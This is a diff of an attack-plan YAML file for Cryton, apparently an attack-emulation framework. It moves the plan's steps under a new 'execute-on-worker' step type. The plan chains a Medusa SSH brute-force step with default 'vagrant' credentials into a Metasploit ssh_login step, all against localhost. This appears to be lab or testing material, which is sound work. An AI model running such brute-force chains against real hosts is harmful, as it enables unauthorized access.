@@ -10,22 +10,26 @@ plan:
     steps:
     - name: bruteforce
       is_init: true
-      attack_module: mod_medusa
-      attack_module_args:
-        target: 127.0.0.1
-        credentials:
-          username: vagrant
-          password: vagrant
+      step_type: cryton/execute-on-worker
+      arguments:
+        attack_module: mod_medusa
+        attack_module_args:
+          target: 127.0.0.1
+          credentials:
+            username: vagrant
+            password: vagrant
       next:
       - type: result
         value: OK
         step: ssh-session
     - name: ssh-session
-      attack_module: mod_msf
-      attack_module_args:
-        exploit: auxiliary/scanner/ssh/ssh_login
-        exploit_arguments:
-          RHOSTS: 127.0.0.1
-          USERNAME: $parent.username # $bruteforce.username could also be used in case of non-successor step
-          PASSWORD: $parent.password # $bruteforce.password could also be used in case of non-successor step
+      step_type: cryton/execute-on-worker
+      arguments:
+        attack_module: mod_msf
+        attack_module_args:
+          exploit: auxiliary/scanner/ssh/ssh_login
+          exploit_arguments:
+            RHOSTS: 127.0.0.1
+            USERNAME: $parent.username # $bruteforce.username could also be used in case of non-successor step
+            PASSWORD: $parent.password # $bruteforce.password could also be used in case of non-successor step
 
